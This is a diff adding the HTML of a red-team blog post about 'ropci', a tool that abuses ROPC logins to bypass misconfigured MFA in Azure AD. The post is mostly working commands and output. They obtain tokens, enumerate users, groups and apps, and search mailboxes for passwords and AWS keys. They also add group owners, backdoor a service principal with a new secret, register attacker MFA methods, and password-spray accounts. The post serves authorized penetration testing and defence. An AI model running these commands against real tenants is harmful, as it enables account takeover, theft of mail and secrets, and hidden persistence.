@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta property="og:title" content=" Ropci deep-dive for Azure hackers &middot;  Embrace The Red" />
+  
+  <meta property="og:site_name" content="Embrace The Red" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2022/ropci-usage/" />
+  
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:article:published_time" content="2022-11-20T18:00:00-07:00" />
+  
+  <meta property="og:article:tag" content="pentest" />
+  
+  <meta property="og:article:tag" content="red" />
+  
+  <meta property="og:article:tag" content="research" />
+  
+  <meta property="og:article:tag" content="cloud" />
+  
+  <meta property="og:article:tag" content="tool" />
+  
+  
+
+  <title>
+     Ropci deep-dive for Azure hackers &middot;  Embrace The Red
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://embracethered.com/blog/images/apple-touch-icon.png" />
+  
+
+  
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@wunderwuzzi23">
+<meta name="twitter:title" content="Ropci deep-dive for Azure hackers">
+<meta name="twitter:description" content="Leverage ropci to pentest your Azure tenant!">
+<meta name="twitter:image" content="https://embracethered.com/blog/images/2022/ropci.png">
+
+<meta name="twitter:creator" content="@wunderwuzzi23">
+
+
+
+
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1739327806831586"
+  crossorigin="anonymous"></script>
+  
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        wunderwuzzi&#39;s blog
+        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1838828869&linkCode=as2&tag=wunderwuzzi-20&linkId=b6523e937607be47499c6010ff489537">OUT NOW: Cybersecurity Attacks - Red Team Strategies</a> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+    
+      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">Ropci deep-dive for Azure hackers</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2022-11-20T18:00:00-07:00">
+          Nov 20, 2022
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/pentest">#pentest</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/research">#research</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/cloud">#cloud</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/tool">#tool</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    <p>Misconfigurations with MFA setups are not uncommon when using AAD, especially when federated setups or Pass Through Authentication is configured I have seen MFA bypass opportunities in multiple production tenants.</p>
+<p>A common misconfiguration is that MFA is enforced at the federated identity provider, but AAD is forgotten and ROPC authentication still succeeds against AAD.</p>
+<p>To learn more about ROPC, check out the <a href="/blog/posts/2022/ropci-so-you-think-you-have-mfa-azure-ad/">previous post about the topic</a>.</p>
+<p>This post focuses on the <code>ropci</code> features that can be leveraged post-exploitation.</p>
+<h2 id="getting-ropci-and-abusing-microsoft-graph-api">Getting ropci and abusing Microsoft Graph API</h2>
+<p><a href="https://github.com/wunderwuzzi23/ropci/releases/tag/v0.1">Download a pre-built release for your platform of choice here</a>.</p>
+<p>Or compile it yourself as per the instructions on <a href="https://github.com/wunderwuzzi23/ropci">Github</a>.</p>
+<h2 id="getting-an-access-token">Getting an Access Token</h2>
+<p>First, run <code>ropci configure</code> to setup the environment. It requires tenant name, username and password.</p>
+<p>Afterwards <code>./ropci auth logon</code> will get you an accesss token if ROPC auth is possible:</p>
+<pre><code>$ ./ropci auth logon 
+Succeeded. Token written to .token.
+</code></pre><ul>
+<li>
+<p>If this call succeeds, then then MFA is not enforced correctly. See more details about the attack avenue in the previous post about <a href="/blog/posts/2022/ropci-so-you-think-you-have-mfa-azure-ad/">ROPC, So you think you have MFA</a></p>
+</li>
+<li>
+<p>If authentication fails you will receive an error message, stating the AAD error that occured.</p>
+</li>
+</ul>
+<p>Its possible to provide a custom <code>client_id</code> by providing the <code>--clientid</code> argument - more about testing of specific apps later.</p>
+<h3 id="refreshing-a-token">Refreshing a Token</h3>
+<p>You can later also refresh a token by running <code>./ropci auth refresh</code>. This also allows you to import a refresh token from elsewhere via <code>./ropci auth refresh --refresh token {token}</code>.</p>
+<h3 id="device-code-support">Device Code Support</h3>
+<p>To get an <code>access_token</code> via the devicecode flow you can leverage <code>./ropci auth deviceflow</code>.</p>
+<p>This is useful if you want to play around with the other post-authentication features of ropci, or if you attempt to do some <a href="/blog/posts/2022/device-code-phishing/">phishing via Device Code based phishing attacks</a>.</p>
+<h2 id="gathering-tenant-data-using-ropci">Gathering tenant data using ropci</h2>
+<p>By default <code>ropci</code> uses the Outlook app, which allows to perform a set of powerful operations:</p>
+<ul>
+<li>List all Users and Groups (<code>./ropci users</code> and <code>./ropci groups</code>)</li>
+<li>Reading email for the compromised account (<code>./ropci mail</code>)</li>
+<li>Reading and uploading files to SharePoint/OneDrive (<code>./ropci drive</code>)</li>
+<li>Using the search API to find secrets and other information ( <code>./ropci search</code>)</li>
+</ul>
+<p>For instance, the <code>Microsoft Whiteboard Client</code> allows sending of emails via <code>./ropci mail send</code>.</p>
+<p>To switch to a different <code>clientid</code> the following command can be used:</p>
+<pre><code>./ropc auth logon --clientid 57336123-6e14-4acc-8dcf-287b6088aa28`.
+</code></pre><h2 id="basic-info-about-a-user">Basic info about a user</h2>
+<p>Show some interesting info about a user (by default logged on user is used):</p>
+<pre><code>./ropci users who [-u joe@example.org]
+</code></pre><p>This will list details about the user and group ownerships and group memberships.</p>
+<h2 id="enumerating-and-evaluating-apps">Enumerating and evaluating apps</h2>
+<p>In case you got an access token it is  a good idea to enumerate all the OAuth apps that are registered for a tenant.</p>
+<p>To do this for all OAuth2 apps (so called servicePrincipals in AAD) use <code>./ropci apps list</code>:</p>
+<pre><code>$ ./ropci apps list
++----------------------------------------------------------------+--------------------------------------+--------------------+
+|                          displayName                           |                appId                 |   publisherName    |
++----------------------------------------------------------------+--------------------------------------+--------------------+
+| Microsoft Teams Mailhook                                       | 51133ff5-8e0d-4078-bcca-84fb7f905b64 | Microsoft Services |
+| OCaaS Client Interaction Service                               | c2ada927-a9e2-4564-aae2-70775a2fa0af | Microsoft Services |
+| Microsoft Office Licensing Service vNext                       | db55028d-e5ba-420f-816a-d18c861aefdf | Microsoft Services |
+| Messaging Bot API Application                                  | 5a807f24-c9de-44ee-a3a7-329e88a00ffc | Microsoft Services |
+| Service Encryption                                             | dbc36ae1-c097-4df9-8d94-343c3d091a76 | Microsoft Services |
+| Microsoft Mobile Application Management Backend                | 354b5b6d-abd6-4736-9f51-1be80049b91f | Microsoft Services |
+| Microsoft Graph                                                | 00000003-0000-0000-c000-000000000000 | Microsoft Services |
+| Permission Service O365                                        | 6d32b7f8-782e-43e0-ac47-aaad9f4eb839 | Microsoft Services |
+| SubscriptionRP                                                 | e3335adb-5ca0-40dc-b8d3-bedc094e523b | Microsoft Services |
+.....
+</code></pre><p>There are likely more then 100 apps in your tenant. <code>ropci</code> will only show you 100 entries by default. Use the <code>--all</code> argument when calling the command to list everything, you can also output all the details as <code>json</code>.</p>
+<pre><code>./ropci apps list --all --format json -o apps.json
+</code></pre><h2 id="perform-a-bulk-authentication-validation">Perform a bulk authentication validation</h2>
+<p>To test all your applications:</p>
+<ol>
+<li>Dump all the apps and write them to a csv file (using <code>./ropci apps list</code>)</li>
+<li>Perform an ROPC based logon for each of them to see which one allow ROPC (using <code>./ropci auth bulk</code>)</li>
+</ol>
+<p>These are the commands:</p>
+<pre><code>./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' &gt; apps.csv
+./ropci auth bulk -i apps.csv -o output.json
+</code></pre><p>Here is an example:</p>
+<pre><code>$ ./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' &gt; apps.csv
+$ ./ropci auth bulk -i apps.csv -o results.json
+ClientIDs from CSV file apps.csv.
+Results will be written to results.json.
+
+Issuing Requests...~420
+Waiting for results...
++------------------------------------------+--------------------------------------+---------+-----------------------------------+
+|               displayName                |                appId                 | result  |               scope               |
++------------------------------------------+--------------------------------------+---------+-----------------------------------+
+| Microsoft Teams ATP Service              | 0fa37baf-7afc-4baf-ab2d-d5bb891d53ef | error   |                                   |
+| Microsoft Dynamics CRM                   | 2db8cb1d-fb6c-450b-ab09-49b6ae35186b | error   |                                   |
+| Microsoft Outlook                        | 5d661950-3475-41cd-a2c3-d671a3162bc1 | success | email openid profile              |
+|                                          |                                      |         | AuditLog.Create Chat.Read         |
+|                                          |                                      |         | DataLossPreventionPolicy.Evaluate |
+|                                          |                                      |         | Directory.Read.All                |
+|                                          |                                      |         | EduRoster.ReadBasic               |
+|                                          |                                      |         | Files.ReadWrite.All               |
+|                                          |                                      |         | Group.ReadWrite.All               |
+|                                          |                                      |         | InformationProtectionPolicy.Read  |
+|                                          |                                      |         | OnlineMeetings.Read People.Read   |
+|                                          |                                      |         | SensitiveInfoType.Detect          |
+|                                          |                                      |         | SensitiveInfoType.Read.All        |
+|                                          |                                      |         | SensitivityLabel.Evaluate         |
+|                                          |                                      |         | User.Invite.All User.Read         |
+|                                          |                                      |         | User.ReadBasic.All                |
+| Service                                  |                                      |         |                                   |
+| PushChannel                              | 4747d38e-36c5-4bc3-979b-b0ef74df54d1 | error   |                                   |
+| Microsoft.MileIQ                         | a25dbca8-4e60-48e5-80a2-0664fdb5c9b6 | success | profile openid email              |
+|                                          |                                      |         | user_impersonation                |
+| Storage Resource Provider                | a6aa9161-5291-40bb-8c5c-923b567bee3b | error   |                                   |
+...
++------------------------------------------+--------------------------------------+---------+-----------------------------------+
+
+Done. 
+You could now run the following command to analyze valid tokens and there scopes:
+$ cat results.json | jq -r 'select (.access_token!=&quot;&quot;) | [.display_name,.scope] | @csv'
+Happy Hacking.
+</code></pre><p>This gives you an idea which applications support ROPC and what permissions they have that an adversary could abuse.
+The result file will already contain the retrieved <code>access_tokens</code> from each app.</p>
+<p>It&rsquo;s also a good list for the IT admins and blue team to monitor and lock down.</p>
+<h2 id="search-the-users-mail-messages">Search the user&rsquo;s mail messages</h2>
+<p>By default the following searches for the word <code>password</code>:</p>
+<pre><code>./ropci search
+</code></pre><p>But you can specify a custom query with <code>-q</code>. Here is an example:</p>
+<pre><code> ./ropci search -q 'AWS_ACCESS' -f rank -f summary
++------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
+| rank |                                                        summary                                                                                            |
++------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
+|    1 | ...is not known. &lt;c0&gt;AWS_ACCESS&lt;/c0&gt;_KEY_ID=AKIAsomethingsomething AWS_SECRET_ACCESS_KEY=this_is_a_secret This grants you access to the EC2 instance and 
+you can create s3 data. Greetings,Security.                                                                                                                        |
++------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Number of items: 1
+</code></pre><p>Pretty neat.</p>
+<p>You can also search for other items, like Sharepoint listItems, etc.. by specifying <code>-t</code> and the type.</p>
+<h2 id="list-all-groups">List all groups</h2>
+<pre><code>./ropci groups list --format json -o groups.json
+cat groups.json | jq -r '.value[].id'
+</code></pre><h2 id="list-membersowners-of-a-groups">List members/owners of a groups</h2>
+<p>To list the members of a group, first get the groupid via the previous group list command, then run:</p>
+<pre><code>./ropci groups members-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
++--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+
+|                  id                  |   displayName    |    userPrincipalName    | givenName |  surname  | department | jobTitle | accountEnabled |
++--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+
+| 838ccee5-c96d-4555-854b-913d5da07fbd | John             | john@example.org        | John      | Tester |            |          | true           |
+| 07537a19-e926-4591-a949-361f7ab97f93 | Bobby            | bob@example.org         | Bob       | Williams  | Security   | Analyst  | true           |
++--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+
+
+Number of items: 2
+</code></pre><p>Similar command exists for owernship checks via <code>./ropci groups owners-list</code>.</p>
+<h2 id="add-an-owner-to-a-group">Add an owner to a group</h2>
+<p>List or add an owner of a group:</p>
+<pre><code>./ropci groups owner-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
+./ropci groups owner-add -u 0df463da-1a1c-4dba-817d-ca72438524ce -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
+</code></pre><p>Removing works also.</p>
+<h2 id="search-for-usersgroups">Search for users/groups:</h2>
+<pre><code>./ropci users list -s userPrincipalName:bob
+</code></pre><h2 id="upload-a-file-to-sharepoint">Upload a file to SharePoint</h2>
+<p>Uploading a file to SharePoint drive:</p>
+<pre><code>./ropci drive upload -p &quot;/Tom @ ExampleOrg, LLC/testing.txt&quot; -d ./ropci -v
+</code></pre><h2 id="read-mail-in-text-form">Read mail in text form</h2>
+<p>The following command will show some basic info about the accounts inbox:</p>
+<pre><code>./ropci mail list
+</code></pre><p>Read mail body.content in text form:</p>
+<pre><code> ./ropci mail list --format json | jq .value[].body.content
+</code></pre><h2 id="invalidate-refresh-tokens">Invalidate Refresh Tokens</h2>
+<p>This is quite important in order to protect yourself:</p>
+<pre><code>./ropci auth invalidate
+</code></pre><p>Which basically calls <code>/me/invalidateAllRefreshTokens</code>:</p>
+<pre><code>./ropci call -c /me/invalidateAllRefreshTokens --verb POST
+</code></pre><p>If you try to refresh now with <code>./ropci auth refresh</code> the following error will be shown:</p>
+<pre><code>AADSTS50173: The provided grant has expired due to it being revoked, a fresh auth token is needed. The user might have changed or reset their password. The grant was issued on '2022-09-05T18:48:10.7367392Z' and the TokensValidFrom date (before which tokens are not valid) for this user is '2022-09-05T18:48:54.0000000Z'
+</code></pre><p>Refresh tokens have been invalidated for the logged on user. If the account has the right permissions one can also call <code>/users/username@expample.org/invalidateAllRefreshTokens</code> to invalidate refresh tokens of another account.</p>
+<h2 id="application-role-assignments-of-a-user">Application Role Assignments of a user</h2>
+<p><a href="https://docs.microsoft.com/en-us/graph/api/user-list-approleassignments?view=graph-rest-beta&amp;tabs=http">Graph API Documentatin</a></p>
+<pre><code>./ropci call -c /users/user@example.org/appRoleAssignments -f id -f principalDisplayName -f resourceDisplayName -f resourceId
++---------------------------------------------+----------------------+-------------------------+--------------------------------------+
+|                     id                      | principalDisplayName |   resourceDisplayName   |              resourceId              |
++---------------------------------------------+----------------------+-------------------------+--------------------------------------+
+| 5c6Mg23JVUWFS5E9XaB_vQObgianBrBMugogPRfMvYU | Vera Mitchell        | Apple Internet Accounts | 36559af8-a122-4101-b6c7-adccfa24506d |
+| 5c6Mg23JVUWFS5E9XaB_vUG-XjOYoexCm4D9r2fYwxI | Vera Mitchell        | Graph Explorer          | f3ff1808-52d0-4516-b090-28a06cd24783 |
+| 5c6Mg23JVUWFS5E9XaB_vaBGH-RIpJRMuE0qYZ7s5ZE | Vera Mitchell        | AppForHealthServices    | 48359af7-af3a-42d4-abe2-8425a14689c9 |
++---------------------------------------------+----------------------+-------------------------+--------------------------------------+
+</code></pre><h2 id="backdooring-a-service-principal-adding-additional-password">Backdooring a Service Principal (adding additional password)</h2>
+<pre><code>$ ./ropci call -c /servicePrincipals/48359af7-af3a-42d4-abe2-8425a14689c9/addPassword \ 
+--verb POST  -b '{&quot;passwordCredential&quot;: { &quot;displayName&quot;: &quot;ropci says this is fine&quot;}} | jq
+
+{
+  &quot;@odata.context&quot;: &quot;https://graph.microsoft.com/beta/$metadata#servicePrincipals('48359af7-af3a-42d4-abe2-8425a14689c9')/addPassword&quot;,
+  &quot;@odata.type&quot;: &quot;#microsoft.graph.servicePrincipal&quot;,
+  &quot;customKeyIdentifier&quot;: null,
+  &quot;endDateTime&quot;: &quot;2024-09-05T19:48:11.1638864Z&quot;,
+  &quot;keyId&quot;: &quot;c47e91ff-986c-4f8f-9cc0-d41bdd038d49&quot;,
+  &quot;startDateTime&quot;: &quot;2022-09-05T19:48:11.1638864Z&quot;,
+  &quot;secretText&quot;: &quot;Yhj8Q~H1np.....4iEGuf0djD&quot;,
+  &quot;hint&quot;: &quot;Yhj&quot;,
+  &quot;displayName&quot;: &quot;ropci says this is fine&quot;
+}
+</code></pre><p>Take note of the response, and the <code>secretText</code>. This is what can be used to impersonate the service principal.</p>
+<p>With that <code>secretText</code>, which is the <code>client_secret</code> you can get an access token via the OAuth2 <code>client_credential</code> flow:</p>
+<pre><code>curl -d 'grant_type=client_credentials&amp;client_id=2581d8b8-2e9c-4374-a418-06f9cfed87ff&amp;client_secret=Yhj8Q~H1np.....4iEGuf0djD&amp;scope=https://graph.microsoft.com/.default' https://login.microsoftonline.com/wuzzi.onmicrosoft.com/oauth2/v2.0/token
+</code></pre><p>Fun times!</p>
+<h2 id="more-useful-recon-commands">More useful recon commands</h2>
+<h3 id="chats">Chats</h3>
+<pre><code>./ropci call -c /me/chats
+</code></pre><h3 id="searching-for-other-items-eg-person">Searching for other items (e.g person)</h3>
+<pre><code>./ropci search -t person -q &quot;ropci&quot; --format json  | jq
+</code></pre><h2 id="generic-call-method">Generic call method</h2>
+<p>The <code>call</code> command allows to invoke the many other APIs that are exposed. Here are a couple of interesting examples:</p>
+<pre><code>./ropci call -c /domains --format json -o domains.json
+./ropci call -c /domains/{tenant}}/verificationDnsRecords --format json -o verificationDnsRecords-domain1.json
+./ropci call -c /organization --format json -o organization.json
+./ropci call -c /identity/conditionalAccess/policies --format json -o conditionalAccess-Policies.json
+</code></pre><pre><code>./ropci call -c '/identity/b2cUserFlows/B2C_test_signin_signup/userflowIdentityProviders'
+</code></pre><h3 id="explore-authentication-methods">Explore authentication methods</h3>
+<pre><code>./ropci auth logon --clientid 27922004-5251-4030-b22d-91ecd9a37ea4 # Use Outlook Mobile clientID
+./ropci call -c '/me/authentication/methods' -f id -f  emailAddress --format json | jq
+
+./ropci call -c '/me/authentication/phoneMethods' -f id -f phoneNumber -f phoneType
+./ropci call -c '/me/authentication/emailMethods' -f id -f emailAddress
+
+./ropci call -c '/me/authentication/phoneMethods' --verb POST -b '{&quot;phoneNumber&quot;: &quot;+1 5558008000&quot;,&quot;phoneType&quot;: &quot;mobile&quot;}'
+./ropci call -c '/me/authentication/emailMethods' --verb POST -b '{&quot;emailAddress&quot;: &quot;joe@example.org&quot;}'
+</code></pre><h3 id="list-deleted-users-or-other-deleted-items">List deleted users or other deleted items</h3>
+<p>When an object (e.g. user account) is deleted, it&rsquo;s not entirely deleted right away. It&rsquo;s possible to restore them within 30 days.
+The following command lists the delete users:</p>
+<pre><code>./ropci call -c /directory/deletedItems/microsoft.graph.user
++--------------------------------------+-------------+------+
+|                  id                  | displayName | name |
++--------------------------------------+-------------+------+
+| e94d329b-ec6a-41fa-923c-fcd0eab5b12e | John Ropci  |      |
+| ea9f55dc-f38b-4344-8731-a97454778094 | Ropci       |      |
++--------------------------------------+-------------+------+
+</code></pre><h2 id="password-spraying">Password Spraying</h2>
+<p>ropci also comes with the ability to perform an ROPC based password spray.</p>
+<pre><code>./ropci auth spray --users-file users.list --passwords-file passwords.list -o result --wait 60 --wait-try 10 
+Attempts: 12 for ClientID d3590ed6-52b3-4102-aeff-aad2292ab01c
+
+Attempt 0001: alice@wunderwuzzi.net                     test1242355                     invalid username or password
+Attempt 0002: tom@wunderwuzzi.net                       test123                         invalid username or password
+Attempt 0003: doesnotexist@wunderwuzzi.net              test1242355                     account does not exist
+Attempt 0004: tom@wunderwuzzi.net                       test1242355                     invalid username or password
+Attempt 0005: tom@wunderwuzzi.net                       Sommer2022!                     invalid username or password
+Attempt 0006: doesnotexist@wunderwuzzi.net              Sommer2022!                     account does not exist
+Attempt 0007: alice@wunderwuzzi.net                     test                            invalid username or password
+Attempt 0008: alice@wunderwuzzi.net                     test123                         invalid username or password
+Attempt 0009: doesnotexist@wunderwuzzi.net              test123                         account does not exist
+Attempt 0010: alice@wunderwuzzi.net                     Sommer2022!                     success
+Attempt 0011: doesnotexist@wunderwuzzi.net              test                            account does not exist
+Attempt 0012: tom@wunderwuzzi.net                       test                            invalid username or password
+</code></pre><p>Be aware of any account lockout policies, and make sure you have proper authorization before engaging in such testing.</p>
+<p>There is a lot more to explore. Hope this was helpful.</p>
+<p>Cheers!</p>
+<h2 id="disclaimer">Disclaimer</h2>
+<p>Pentesting and security assessments require authorization from proper stakeholders. Do not do anything illegal.</p>
+<h2 id="references-and-further-reading-material">References and further reading material</h2>
+<ul>
+<li><a href="https://o365blog.com/aadinternals">AADInternals by @DrAzureAD</a></li>
+<li><a href="https://github.com/secureworks/family-of-client-ids-research">Abusing Family Refresh Tokens by SecureWorks</a></li>
+<li>Other interesting tooling: <a href="https://github.com/dirkjanm/ROADtools">ROADTools</a>, <a href="https://github.com/Flangvik/TeamFiltration">TeamFiltration</a></li>
+<li><a href="https://learn.microsoft.com/en-us/graph/">Microsoft Graph API</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6749.html">OAuth RFC</a></li>
+<li><a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#page-9">OAuth 2.0 Security Best Current Practice</a></li>
+<li><a href="https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth-ropc">Microsoft ROPC docs</a></li>
+</ul>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2022/ropci-pentest-magazine-open-source-tools/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2018-2022
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
+  
+</body>
+</html>
+
